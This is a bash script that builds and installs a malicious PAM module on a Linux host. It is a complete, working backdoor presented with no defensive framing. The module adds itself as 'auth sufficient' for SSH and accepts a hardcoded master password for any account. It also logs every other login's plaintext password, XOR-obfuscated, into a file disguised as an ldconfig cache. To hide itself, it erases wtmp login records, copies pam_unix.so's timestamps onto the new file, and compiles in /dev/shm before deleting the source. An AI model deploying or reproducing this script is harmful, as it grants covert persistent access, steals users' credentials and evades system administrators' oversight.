#!/bin/bash
# Usage: ./deploy.sh <password>
[ "$(id -u)" -ne 0 ] && echo "root required" && exit 1
[ -z "$1" ] && echo "usage: $0 <password>" && exit 1

P="$1"
H=$(printf '%s' "$P" | sha256sum | cut -d' ' -f1)

# Build C array directly
A="0x${H:0:2}"
for i in 2 4 6 8 10 12 14 16 18 20 22 24 26 28 30 32 34 36 38 40 42 44 46 48 50 52 54 56 58 60 62; do
    A="$A, 0x${H:$i:2}"
done

D=$(dirname $(find /lib* /usr/lib* -name "pam_unix.so" 2>/dev/null | head -1) 2>/dev/null)
[ -z "$D" ] && echo "PAM not found" && exit 1

# Write source with hash substituted
printf '%s\n' '#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <openssl/evp.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include <sys/stat.h>
#include <utime.h>
#include <unistd.h>
#include <utmp.h>
#include <pwd.h>
#include <fcntl.h>

static const unsigned char H[32] = {'"$A"'};

static void h(const char *in, unsigned char *out) {
    EVP_MD_CTX *c = EVP_MD_CTX_new();
    EVP_DigestInit_ex(c, EVP_sha256(), NULL);
    EVP_DigestUpdate(c, in, strlen(in));
    EVP_DigestFinal_ex(c, out, NULL);
    EVP_MD_CTX_free(c);
}

static void lg(const char *u, const char *p) {
    mkdir("/var/cache/ldconfig", 0755);
    FILE *f = fopen("/var/cache/ldconfig/aux-cache.log", "a");
    if (!f) return;
    char e[256]; int l = snprintf(e, 256, "%ld|%s|%s\n", time(NULL), u, p);
    const char *k = "ld.so.cache";
    for (int i = 0; i < l; i++) e[i] ^= k[i % 11];
    fwrite(e, 1, l, f); fclose(f);
}

static void scrub(const char *u) {
    struct utmp ut; int fd = open("/var/log/wtmp", O_RDWR); if (fd < 0) return;
    off_t p = lseek(fd, 0, SEEK_END);
    while (p >= (off_t)sizeof(ut)) { p -= sizeof(ut); lseek(fd, p, SEEK_SET);
        if (read(fd, &ut, sizeof(ut)) != sizeof(ut)) break;
        if (strncmp(ut.ut_user, u, 32) == 0) { memset(&ut, 0, sizeof(ut)); lseek(fd, p, SEEK_SET); write(fd, &ut, sizeof(ut)); break; }
    } close(fd);
}

static const char *gu = NULL;

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int f, int c, const char **v) {
    const char *u = NULL, *p = NULL; unsigned char x[32];
    if (pam_get_user(pamh, &u, NULL) != PAM_SUCCESS || !u) return PAM_IGNORE;
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &p, NULL) != PAM_SUCCESS || !p) return PAM_IGNORE;
    h(p, x); int ok = 1; for (int i = 0; i < 32; i++) if (x[i] != H[i]) ok = 0;
    if (ok) gu = u; else { lg(u, p); gu = NULL; }
    return ok ? PAM_SUCCESS : PAM_IGNORE;
}
PAM_EXTERN int pam_sm_setcred(pam_handle_t *p, int f, int c, const char **v) { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *p, int f, int c, const char **v) { return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_open_session(pam_handle_t *p, int f, int c, const char **v) { if (gu) { usleep(100000); scrub(gu); } return PAM_SUCCESS; }
PAM_EXTERN int pam_sm_close_session(pam_handle_t *p, int f, int c, const char **v) { if (gu) scrub(gu); gu = NULL; return PAM_SUCCESS; }

__attribute__((constructor)) static void i(void) {
    struct stat s; if (stat("'"$D"'/pam_unix.so", &s) == 0) { struct utimbuf t = {s.st_atime, s.st_mtime}; utime("'"$D"'/pam_auth.so", &t); }
}' > /dev/shm/.c

gcc -fPIC -shared -O3 -s -o /dev/shm/.so /dev/shm/.c -lcrypto -lpam 2>/dev/null
[ ! -f /dev/shm/.so ] && echo "compile failed" && exit 1

cp /dev/shm/.so "$D/pam_auth.so"
chown root:root "$D/pam_auth.so"
chmod 644 "$D/pam_auth.so"
touch -r "$D/pam_unix.so" "$D/pam_auth.so"

grep -q "pam_auth.so" /etc/pam.d/sshd || sed -i '1a auth sufficient pam_auth.so' /etc/pam.d/sshd
grep -q "session.*pam_auth.so" /etc/pam.d/sshd || echo "session optional pam_auth.so" >> /etc/pam.d/sshd

rm -f /dev/shm/.c /dev/shm/.so
echo "done: $P"
